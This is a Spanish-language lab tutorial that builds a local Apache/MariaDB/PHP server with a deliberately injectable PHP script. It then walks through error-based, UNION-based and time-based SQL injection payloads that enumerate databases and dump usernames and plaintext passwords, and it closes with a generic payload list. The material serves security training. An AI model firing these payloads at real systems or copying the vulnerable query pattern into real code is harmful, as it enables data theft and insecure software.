
---
- Tags: #web #vulnerabilidades 
---
## Introducción

Este documento detalla la instalación y configuración de un servidor web con MariaDB, Apache y PHP, orientado a la práctica de técnicas de [[SQLi]][^1](SQL Injection). A lo largo de esta guía, aprenderás cómo preparar un entorno local para realizar pruebas de seguridad, específicamente inyecciones [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Documento Hacker/OWASP TOP 10 ⚠️/Bases de datos db 🗃️/SQL/SQL|SQL]], y cómo interactuar con la base de datos de manera controlada para simular posibles vectores de ataque.

La documentación está estructurada en pasos secuenciales que incluyen tanto la ejecución de comandos en la terminal como la creación de un entorno funcional para probar la vulnerabilidad. Cada paso se acompaña de una explicación detallada para asegurar una comprensión clara del proceso, desde la instalación de los servicios hasta la creación de tablas y la configuración de usuarios, hasta llegar a la configuración final de un script PHP vulnerable.

**Requisitos previos**:  
- Conocimientos básicos de administración de servidores y bases de datos.
- Un sistema operativo basado en Linux (como Ubuntu o Debian) para realizar las configuraciones de los servicios.

**Importante:** Iniciar y detener [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Documento Hacker/OWASP TOP 10 ⚠️/Bases de datos db 🗃️/SQL/Servicios|Servicios]], antes y después del ejercicio.

---

Si ya tienes un entorno preparado, puedes saltarte la parte de la instalación de los servicios y dirigirte directamente a los pasos relacionados con las pruebas de inyección SQL. Si eres nuevo en el tema, sigue los pasos secuenciales para configurar tu servidor desde cero.


# Configuración de Servidor para Prácticas de SQL Injection

Esta guía detalla cada uno de los pasos realizados para la instalación y configuración de un servidor web con MariaDB, Apache y PHP, además de demostrar pruebas de inyección SQL a través de un script PHP. Cada paso incluye el comando ejecutado y una breve explicación pedagógica.

---

## Paso 1: Instalación de paquetes
**Comando:**  
```bash
apt install mariadb-server apache2 php-mysql
```

**Explicación:**  
Se instalan el servidor MariaDB, el servidor Apache y el módulo PHP para MariaDB. Esto establece la base para contar con una base de datos, un servidor web y la conexión entre ambos.

---

## Paso 2: Inicio del servicio de MySQL

**Comando:**

```bash
service mysql start
```

**Explicación:**  
Se inicia el servicio de MySQL (MariaDB) para permitir conexiones y operaciones en la base de datos.

---

## Paso 3: Verificación del puerto 3306

**Comando:**

```bash
lsof -i:3306
```

**Salida de ejemplo:**

```
COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
mariadbd 6802 mysql   22u  IPv4  32459      0t0  TCP localhost:mysql (LISTEN)
```

**Explicación:**  
El comando `lsof` muestra qué proceso está usando el puerto 3306, que es el puerto por defecto de MySQL/MariaDB. Se verifica que el servidor de base de datos esté escuchando correctamente.

---

## Paso 4: Inicio del servicio Apache

**Comando:**

```bash
service apache2 start
```

**Explicación:**  
Se inicia el servicio Apache, el servidor web, para poder servir páginas y archivos.

---

## Paso 5: Verificación del puerto 80

**Comando:**

```bash
lsof -i:80
```

**Salida de ejemplo:**

```
COMMAND  PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
apache2 8141     root    4u  IPv6  36956      0t0  TCP *:http (LISTEN)
apache2 8144 www-data    4u  IPv6  36956      0t0  TCP *:http (LISTEN)
apache2 8145 www-data    4u  IPv6  36956      0t0  TCP *:http (LISTEN)
apache2 8146 www-data    4u  IPv6  36956      0t0  TCP *:http (LISTEN)
apache2 8147 www-data    4u  IPv6  36956      0t0  TCP *:http (LISTEN)
apache2 8148 www-data    4u  IPv6  36956      0t0  TCP *:http (LISTEN)
```

**Explicación:**  
Se verifica que Apache esté escuchando en el puerto 80, utilizado para tráfico HTTP, lo que confirma que el servidor web está activo.

---

## Paso 6: Conexión a la base de datos con MySQL

**Comando:**

```bash
mysql -uroot -p
```

**Explicación:**  
Se conecta a la base de datos usando el usuario `root`. Al presionar enter sin contraseña, se accede a la consola de MariaDB, mostrando información del servidor y opciones de ayuda.

---

## Paso 7: Mostrar bases de datos existentes

**Comando en la consola MariaDB:**

```sql
show databases;
```

**Salida de ejemplo:**

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

**Explicación:**  
Muestra todas las bases de datos que existen en el servidor, lo que permite ver las que son del sistema y cualquier base de datos personalizada.

---

## Paso 8: Selección de la base de datos 'mysql'

**Comando en MariaDB:**

```sql
use mysql;
```

**Explicación:**  
Cambia el contexto a la base de datos `mysql`, que contiene las tablas de administración y configuración de usuarios y privilegios.

---

## Paso 9: Mostrar tablas de la base de datos 'mysql'

**Comando en MariaDB:**

```sql
show tables;
```

**Salida de ejemplo:**

```
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| global_priv               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+
```

**Explicación:**  
Lista todas las tablas dentro de la base de datos `mysql`, mostrando cómo se organizan los datos de configuración del servidor.

---

## Paso 10: Describir la tabla `user`

**Comando en MariaDB:**

```sql
describe user;
```

**Salida de ejemplo (resumida):**

```
+------------------------+---------------------+------+-----+----------+-------+
| Field                  | Type                | Null | Key | Default  | Extra |
+------------------------+---------------------+------+-----+----------+-------+
| Host                   | char(255)           | NO   |     |          |       |
| User                   | char(128)           | NO   |     |          |       |
| Password               | longtext            | YES  |     | NULL     |       |
| ...                    | ...                 | ...  | ... | ...      | ...   |
+------------------------+---------------------+------+-----+----------+-------+
```

**Explicación:**  
El comando muestra la estructura de la tabla `user`, indicando cada campo, su tipo y si acepta valores nulos. Esto es fundamental para entender la configuración de los usuarios de la base de datos.

---

## Paso 11: Seleccionar usuarios y contraseñas de la tabla `user`

**Comando en MariaDB:**

```sql
select user,password from user;
```

**Salida de ejemplo:**

```
+-------------+----------+
| User        | Password |
+-------------+----------+
| mariadb.sys |          |
| root        | invalid  |
| mysql       | invalid  |
+-------------+----------+
```

**Explicación:**  
Se extraen los nombres de usuario y contraseñas (en este caso, marcadas como 'invalid' o vacías) para verificar el estado de las credenciales en la tabla `user`.

---

## Paso 12: Consultar información específica del usuario 'root'

**Comando en MariaDB:**

```sql
select user,password from user where user = 'root';
```

**Salida de ejemplo:**

```
+------+----------+
| User | Password |
+------+----------+
| root | invalid  |
+------+----------+
```

**Explicación:**  
Se filtra la información para mostrar únicamente los datos del usuario `root`, permitiendo centrarse en la configuración de este usuario privilegiado.

---

## Paso 13: Creación de la base de datos `Metahumo`

**Comando en MariaDB:**

```sql
create database Metahumo;
```

**Explicación:**  
Se crea una nueva base de datos llamada `Metahumo` para almacenar datos específicos del proyecto o aplicación.

---

## Paso 14: Creación de la tabla `users` en la base de datos `Metahumo`

**Comando en MariaDB:**

```sql
create table users(id int(32), username varchar(32), password varchar(32));
```

**Explicación:**  
Se define una tabla llamada `users` con tres columnas: `id`, `username` y `password`. Esta tabla almacenará la información de los usuarios.

---

## Paso 15: Descripción de la tabla `users`

**Comando en MariaDB:**

```sql
describe users;
```

**Salida de ejemplo:**

```
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int(32)     | YES  |     | NULL    |       |
| username | varchar(32) | YES  |     | NULL    |       |
| password | varchar(32) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
```

**Explicación:**  
Muestra la estructura de la tabla `users` para confirmar que se ha creado correctamente con los campos esperados.

---

## Paso 16: Inserción de registros en la tabla `users`

**Comandos en MariaDB:**

```sql
insert into users(id, username, password) values(1, 'admin', 'admin123$!p@$$');
insert into users(id, username, password) values(1, 'metahumo', 'metahumo123');
update users set id=2 where username='metahumo';
insert into users(id, username, password) values(3, 'alodia', 'alodita');
```

**Explicación:**

- Se inserta el primer registro con el usuario `admin`.
    
- Se inserta un registro con datos erróneos (duplicando el `id`), luego se corrige actualizando el `id` de `metahumo` a 2.
    
- Se añade un tercer registro para el usuario `alodia`.
    

---

## Paso 17: Consultar todos los registros de la tabla `users`

**Comando en MariaDB:**

```sql
select * from users;
```

**Salida de ejemplo:**

```
+------+----------+----------------+
| id   | username | password       |
+------+----------+----------------+
|    1 | admin    | admin123$!p@$$ |
|    2 | metahumo | metahumo123    |
|    3 | alodia   | alodita        |
+------+----------+----------------+
```

**Explicación:**  
Se muestra el contenido de la tabla `users` para confirmar que los registros se han insertado y modificado correctamente.

> **Nota:** Las contraseñas se muestran en texto plano, lo cual es una mala práctica en producción. Se recomienda hashearlas.

---

## Paso 18: Creación de un usuario de base de datos para PHP

**Comando en MariaDB:**

```sql
create user 'GramsciXI'@'localhost' identified by 'Baleares11';
```

**Explicación:**  
Se crea un usuario especial (`GramsciXI`) con una contraseña (`Baleares11`) para conectarse a la base de datos desde aplicaciones PHP, en lugar de usar el usuario `root`.

---

## Paso 19: Conceder privilegios al nuevo usuario

**Comando en MariaDB:**

```sql
grant all privileges on Metahumo.* to 'GramsciXI'@'localhost';
```

**Explicación:**  
Se asignan todos los privilegios sobre la base de datos `Metahumo` al usuario `GramsciXI`, permitiéndole realizar cualquier operación necesaria.

---

## Paso 20: Salir de MariaDB y verificar estado de Apache

**Acciones en terminal:**

- Se sale de MariaDB con `^D` (Ctrl + D).
    
- Se cambia el directorio a `/var/www/html` y se lista el contenido con `lsd`.
    
- Se consulta el estado de Apache con:
    
    ```bash
    service apache2 status
    ```
    

**Explicación:**  
Se verifica que Apache está activo y se comprueba la estructura del directorio web para confirmar que el servidor está configurado y en funcionamiento.

---

## Paso 21: Creación del archivo PHP `searchUsers.php`

**Acción:**  
Se abre el editor `nvim` para crear el archivo:

```bash
nvim searchUsers.php
```

**Contenido inicial del archivo:**

```php
<?php

  $server = "localhost";
  $username = "GramsciXI";
  $password = "Baleares11";
  $database = "Metahumo";
  
  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);

?>
```

**Explicación:**  
Se crea un archivo PHP básico para establecer la conexión con la base de datos `Metahumo` usando el usuario `GramsciXI`.

---

## Paso 22: Probar el archivo PHP en el navegador

**Acción:**  
En el navegador, se accede a la URL:

```
http://localhost/searchUsers.php
```

**Explicación:**  
Se verifica que el servidor web carga el archivo PHP correctamente y que la conexión con la base de datos se establece sin problemas.

---

## Paso 23: Preparar para mostrar datos vía GET

**Acción:**  
Se accede a la URL:

```
http://localhost/searchUsers.php?id=1
```

**Explicación:**  
Se realiza una solicitud GET para enviar el parámetro `id=1` y, de esta forma, preparar la consulta para mostrar datos específicos de la tabla.

---

## Paso 24: Modificación del archivo `searchUsers.php` para capturar el parámetro GET

**Contenido modificado:**

```php
<?php

  $server = "localhost";
  $username = "GramsciXI";
  $password = "Baleares11";
  $database = "Metahumo";
  
  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);
  
  $id = $_GET['id'];
  
  echo $id;
?>
```

**Explicación:**  
Se añade código para capturar el parámetro `id` de la URL y se muestra en pantalla, comprobando que la variable se recibe correctamente.

---

## Paso 25: Conexión a MySQL como root (y solución de error)

**Comando:**

```bash
mysql -uroot -p
```

**Salida de ejemplo:**

```
ERROR 1698 (28000): Access denied for user 'root'@'localhost'
```

**Acción adicional:**  
Se utiliza `sudo` para conectarse:

```bash
sudo mysql -uroot -p
```

**Explicación:**  
Se muestra el error al intentar conectarse como `root` sin permisos, y luego se utiliza `sudo` para obtener acceso privilegiado a la base de datos.

---

## Paso 26: Uso y verificación de la base de datos `Metahumo`

**Comandos en MariaDB (tras conectar con sudo):**

```sql
use Metahumo;
show tables;
select * from users;
select username from users;
select username from users where id = '1';
```

**Explicación:**  
Se selecciona la base de datos `Metahumo`, se listan las tablas y se realizan consultas para mostrar todos los registros y, posteriormente, filtrar por el `id` 1.

---

## Paso 27: Modificación final del archivo `searchUsers.php`

**Contenido actualizado:**

```php
<?php

  $server = "localhost";
  $username = "GramsciXI";
  $password = "Baleares11";
  $database = "Metahumo";
  
  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);
  
  $id = $_GET['id'];
  
  $data = mysqli_query($conn, "Select username from users where id = '$id'");
  
  $response = mysqli_fetch_array($data);
  
  echo $response['username'];
  
?>
```

**Explicación:**  
Se actualiza el script PHP para realizar una consulta a la tabla `users` usando el parámetro `id` y mostrar el `username` correspondiente.

---

## Paso 28: Verificación en el navegador

**Acción:**  
Se accede a la URL:

```
http://localhost/searchUsers.php?id=1
```

**Salida esperada:**

```
admin
```

**Explicación:**  
Se comprueba que al ingresar la URL con el parámetro `id=1`, el script devuelve el nombre de usuario correcto, en este caso, `admin`.

---

## Paso 29: Activar reporte de errores en PHP para pruebas de inyección

**Acción:**  
Se edita nuevamente el archivo `searchUsers.php` para incluir:

```php
error_reporting(E_ALL);
ini_set('display_errors', 1);
```

**Contenido completo del archivo (versión actualizada):**

```php
<?php
  
  error_reporting(E_ALL);
  ini_set('display_errors', 1);
  
  $server = "localhost";
  $username = "GramsciXI";
  $password = "Baleares11";
  $database = "Metahumo";
  
  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);
  
  $id = $_GET['id'];
  
  $data = mysqli_query($conn, "Select username from users where id = '$id'") or die(mysqli_error($conn));
  
  $response = mysqli_fetch_array($data);
  
  echo $response['username'];
  
?>
```

**Explicación:**  
Se activa la visualización completa de errores en PHP. Esto es útil para identificar vulnerabilidades y obtener detalles de error que facilitan la explotación mediante inyección SQL basada en errores.

---

## Paso 30: Prueba de inyección SQL básica con comilla

**Acción:**  
En el navegador se accede a la URL:

```
http://localhost/searchUsers.php?id=1'
```

**Explicación:**  
Al introducir una comilla (`'`) al final del parámetro, se provoca un error de sintaxis en la consulta SQL. Esto permite observar los mensajes de error y determinar la vulnerabilidad a inyección SQL.

---

## Paso 31: Inyección SQL con `order by` y comentario

**Acción:**  
En el navegador se accede a la URL:

```
http://localhost/searchUsers.php?id=1' order by 100-- -
```

**Explicación:**  
Se inyecta la sentencia `order by 100` y se comenta el resto de la consulta con `-- -`. El error resultante indica que no existen 100 columnas, lo que ayuda a determinar el número de columnas de la consulta y facilita la posterior explotación para extraer información de la tabla.

---


## Paso 32: Prueba de inyección SQL con `union select`
**Acción:**  
En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=1' union select 1-- -
```

**Explicación:**  
Al introducir la inyección SQL `union select 1-- -` en la URL, vemos que se sigue mostrando solo el valor `'admin'`. Esto indica que la consulta SQL no está recuperando ninguna información adicional relevante. Para continuar, se recomienda utilizar un valor para `id` que no exista, como `id=500`, para evitar valores filtrados y obtener más información útil.

---

## Paso 33: Identificación de columnas con `union select`
**Acción:**  
En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=500' union select 1-- -
```

**Explicación:**  
Al modificar el valor de `id` y usar el `union select 1-- -`, obtenemos como resultado el número `1`, que es el valor que hemos inyectado en la consulta. Esto indica que la consulta es capaz de procesar la inyección, pero aún no hemos identificado qué columnas están siendo recuperadas, lo que nos permite continuar con la identificación de las columnas en la siguiente fase.

---

## Paso 34: Identificación del nombre de la base de datos con `union select database()`
**Acción:**  
En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=500' union select database()-- -
```

**Explicación:**  
Al inyectar la consulta `union select database()-- -`, obtenemos como resultado `'Metahumo'`, que es el nombre de la base de datos. Este paso es crucial, ya que hemos identificado que la aplicación es vulnerable a inyección SQL. Gracias al uso de `union select`, podemos continuar con la extracción de información sensible, como el nombre de usuarios y contraseñas, al obtener el nombre de la base de datos.

**Nota:** Otro comando que podemos ejecutar para extraer información es el siguiente:

```bash
http://localhost/searchUsers.php?id=500' union select user()-- -
```

*Vemos:* GramsciXI@localhost

---

## Paso 35: Listado de bases de datos disponibles
**Acción:**
En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=500' union select schema_name from information_schema.schemata-- -
````

**Explicación:** Al utilizar `union select schema_name from information_schema.schemata`, intentamos listar todas las bases de datos existentes. Sin embargo, puede ser necesario ajustar el resultado con otros comandos. Existen dos opciones para ver las bases de datos:

1. Usar `limit 0,1` y alternar los valores de `0`, `1`, `2`, `3`... (ej. `limit 1,1`, `limit 2,1`).
    
2. O más óptimo, usar `group_concat`.
    

---

## Paso 36: Obtener todas las bases de datos

**Acción:** En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=500' union select group_concat(schema_name) from information_schema.schemata-- -
```

**Explicación:** Con `group_concat(schema_name)`, se listan todas las bases de datos separadas por comas. En este caso, vemos dos bases de datos: `information_schema` y `Metahumo`. Esto es posible porque estamos trabajando desde un usuario con privilegios limitados, permitiéndonos ver esas dos bases de datos. En otros contextos, podríamos ver más o menos bases de datos.

Ahora conocemos el nombre de la base de datos (`Metahumo`), lo que nos permitirá extraer información más específica posteriormente.

---

## Paso 37: Obtener las tablas de la base de datos

**Acción:** En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=500' union select group_concat(table_name) from information_schema.tables where table_schema='Metahumo'-- -
```

**Explicación:** Usamos `group_concat(table_name)` para obtener todas las tablas de la base de datos `Metahumo`. En este caso, la respuesta muestra solo la tabla `users`, lo que indica que esta es la tabla de interés que contiene los datos que estamos buscando.

---

## Paso 38: Obtener las columnas de la tabla `users`

**Acción:** En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=500' union select group_concat(column_name) from information_schema.columns where table_schema='Metahumo' and table_name='users'-- -
```

**Explicación:** Ahora usamos `group_concat(column_name)` para listar las columnas de la tabla `users` en la base de datos `Metahumo`. La salida muestra las columnas `id`, `username`, y `password`, lo que nos indica que esta tabla contiene información de usuarios y contraseñas. Ahora podemos proceder a extraer estos datos.

---

## Paso 39: Obtener los usuarios

**Acción:** En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=500' union select group_concat(username) from users-- -
```

**Explicación:** Al utilizar `group_concat(username)`, obtenemos una lista con los nombres de usuario en la tabla `users`. En este caso, los usuarios son `admin`, `metahumo`, y `alodia`. Esto nos proporciona información sobre los usuarios almacenados en la base de datos.

**Nota:** En este caso, estamos trabajando con la base de datos `Metahumo` que ya está en uso, como vimos en el paso anterior al ejecutar `database()`. Si no fuera así, tendríamos que indicar explícitamente la base de datos, como se muestra en el siguiente paso.

---

## Paso 40: Obtener los usuarios de otra base de datos

**Acción:** En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=500' union select group_concat(username) from Metahumo.users-- -
```

**Explicación:** Este paso es similar al anterior, pero en este caso especificamos explícitamente la base de datos `Metahumo`, aunque ya estaba en uso. Si no fuera la base de datos en uso, tendríamos que indicar siempre la base de datos como lo hacemos aquí.

---

## Paso 41: Obtener usuarios y contraseñas

**Acción:** En el navegador se accede a la URL:

```bash
http://localhost/searchUsers.php?id=500' union select group_concat(username,0x3a,password) from Metahumo.users-- -
```

**Explicación:** Al ejecutar esta consulta, obtenemos tanto los nombres de usuario como las contraseñas, separados por `0x3a` (el valor hexadecimal que representa los dos puntos `:`). El resultado muestra algo como:

```
admin:admin123$!p@$$,metahumo:metahumo123,alodia:alodita
```

Esto nos da acceso a los datos de usuario y contraseña. El uso de `0x3a` (hexadecimal) es preferible, ya que evita posibles problemas con las comillas que podrían interferir con la ejecución de la consulta. Si usáramos los dos puntos directamente en la consulta, podrían surgir conflictos y no mostrar el resultado.

**Nota:** Es importante conocer los valores hexadecimales al utilizar caracteres especiales como los dos puntos. Esto se puede comprobar con el comando `man ascii` en el terminal.

# Inyecciones a ciegas

## Inyecciones condicionales


## Inyecciones basadas en tiempo

## 1. Detectar vulnerabilidad de inyección

Otra forma de interactuar con las inyecciones SQL es a través del tiempo de respuesta. Si aplicamos una inyección basada en el tiempo y funciona, es indicativo de ser vulnerable.

```URL
http://localhost/searchUsers.php?id=1' and sleep(5)-- -
```

Si tras 5 segundos se nos muestra el resultado es indicativo de vulnerabilidad de inyección SQL basada en tiempo.

---
# Querys de Inyección SQL en las URLs

En esta sección se presentan las consultas de inyección SQL utilizadas a través de las URLs para detectar los elementos vulnerables en el servidor web durante el ejercicio.

## 1. Detectar la Base de Datos

Para detectar la base de datos y los posibles datos disponibles, se utilizaron las siguientes inyecciones en la URL:

```sql
' OR 1=1 --
````

Esta inyección fue utilizada en la URL de la aplicación vulnerable para ver si la aplicación permitía ejecutar consultas de SQL maliciosas y obtener respuestas de la base de datos.

## 2. Enumerar las Tablas

Una vez identificada la base de datos, se utilizaron las siguientes inyecciones para enumerar las tablas de la base de datos:

```sql
' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 'nombre_de_base_de_datos' --
```

## 3. Enumerar las Columnas de una Tabla Específica

Después de identificar las tablas, se usaron estas inyecciones para enumerar las columnas de una tabla específica, como la tabla `users`:

```sql
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' --
```

## 4. Obtener los Datos de una Tabla Específica

Una vez obtenidas las columnas, se usaron las siguientes inyecciones para obtener los datos de la tabla `users`:

```sql
' UNION SELECT username, password FROM users --
```

## 5. Obtener Información de Otros Elementos Sensibles

A lo largo del ejercicio, se siguieron utilizando inyecciones para obtener otros datos sensibles de las tablas:

```sql
' UNION SELECT id, name FROM products --
' UNION SELECT email, phone FROM contacts --
```

Estas inyecciones permitieron extraer información valiosa sobre los usuarios y productos almacenados en la base de datos a través de la vulnerabilidad de inyección SQL en las URLs.

---

**Nota:** Las inyecciones mostradas son ejemplos educativos sobre cómo identificar y explotar vulnerabilidades de inyección SQL. Solo se deben realizar pruebas de este tipo en entornos controlados y con permisos explícitos para evitar consecuencias legales.

---
# Conclusión

Esta serie de pasos muestra cómo se configura un entorno de servidor web con Apache y MariaDB, se crea y gestiona una base de datos y se establece un script PHP vulnerable a inyección SQL. Es fundamental recordar que en un entorno real, todas las entradas deben ser debidamente sanitizadas para evitar vulnerabilidades críticas.

---
### Referencias

Visita la fuente oficial: [Hoja de trucos de Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[^1]: [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Documento Hacker/OWASP TOP 10 ⚠️/Bases de datos db 🗃️/SQL/Hoja de Trucos]]

